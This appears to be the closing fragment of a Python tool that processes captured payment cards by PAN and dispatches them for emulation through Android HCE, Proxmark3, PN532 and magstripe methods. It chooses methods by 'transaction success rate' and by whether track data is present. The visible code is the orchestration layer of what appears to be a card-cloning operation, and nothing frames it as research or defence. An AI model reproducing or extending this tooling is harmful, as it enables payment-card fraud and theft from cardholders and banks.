                        self.logger.log(f"Emulation dispatch error for {pan}: {e}", "ERROR")
                        card_data['status'] = 'emulation_failed'
                
                time.sleep(self.config.scan_interval)
                
            except Exception as e:
                self.logger.log(f"Emulation dispatcher error: {e}", "ERROR")
                time.sleep(self.config.scan_interval * 2)
    
    def _dispatch_multi_emulation(self, pan: str, card_data: dict):
        """Dispatch card for multi-method emulation preparation"""
        card = card_data['card'] 
        self.logger.log(f"Dispatching multi-method emulation for {pan}", "INFO")
        
        # Update status
        card_data['status'] = 'preparing_emulation'
        card_data['emulation_methods'] = []
        
        # Determine optimal emulation methods for this card
        optimal_methods = self._determine_optimal_emulation_methods(card, card_data)
        
        # Prepare each emulation method
        for method in optimal_methods:
            try:
                emulation_result = self._prepare_emulation_method(card, method, pan)
                card_data['emulation_methods'].append(emulation_result)
                self.logger.log(f"Emulation method {method} prepared for {pan}", "INFO")
                
            except Exception as e:
                self.logger.log(f"Emulation method {method} failed for {pan}: {e}", "ERROR")
                card_data['emulation_methods'].append({
                    'method': method,
                    'status': 'failed',
                    'error': str(e)
                })
        
        # Mark as completed
        card_data['status'] = 'emulation_ready'
        card_data['completed_at'] = datetime.now().isoformat()
        
        self.logger.log(f"Multi-method emulation completed for {pan}", "INFO")
    
    def _determine_optimal_emulation_methods(self, card, card_data: dict):
        """Determine optimal emulation methods based on card capabilities and success rates"""
        methods = []
        
        # Always include HCE Android (most versatile)
        methods.append(EmulationMethod.HCE_ANDROID)
        
        # Add Proxmark3 if transaction success rate is high
        transaction_success = self._calculate_transaction_success_rate(card_data)
        if transaction_success > 0.5:
            methods.append(EmulationMethod.PROXMARK3)
        
        # Add PN532 for development/testing
        methods.append(EmulationMethod.PN532)
        
        # Add Magstripe if track data available
        if hasattr(card, 'track_data') and card.track_data:
            methods.append(EmulationMethod.MAGSTRIPE)
            
        return methods


if __name__ == "__main__":
    main()
